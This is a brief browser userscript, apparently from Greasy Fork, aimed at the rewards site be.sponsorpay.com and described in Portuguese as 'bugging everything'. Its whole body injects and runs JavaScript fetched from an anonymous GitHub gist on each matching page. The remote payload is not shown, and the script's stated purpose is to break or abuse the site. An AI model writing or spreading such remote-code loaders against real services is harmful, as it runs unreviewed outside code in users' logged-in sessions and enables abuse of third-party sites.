// ==UserScript==
// @name        PSV3 - NOVO
// @namespace   PSV3 - NOVO
// @description BUGANDO TUDO
// @include     https://be.sponsorpay.com/*
// @include     http://be.sponsorpay.com/*
// @version     4.00
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/12211/PSV3%20-%20NOVO.user.js
// @updateURL https://update.greasyfork.org/scripts/12211/PSV3%20-%20NOVO.meta.js
// ==/UserScript==

(function () {
    var scriptElement = document.createElement( "script" );
    scriptElement.type = "text/javascript";
    scriptElement.src="https://gist.githubusercontent.com/anonymous/eaacbf2566f0c7ee28bb/raw/5f01979881b5bdd1c240637e6a7908e229635f8b/gs.js";
    document.body.appendChild( scriptElement );
})();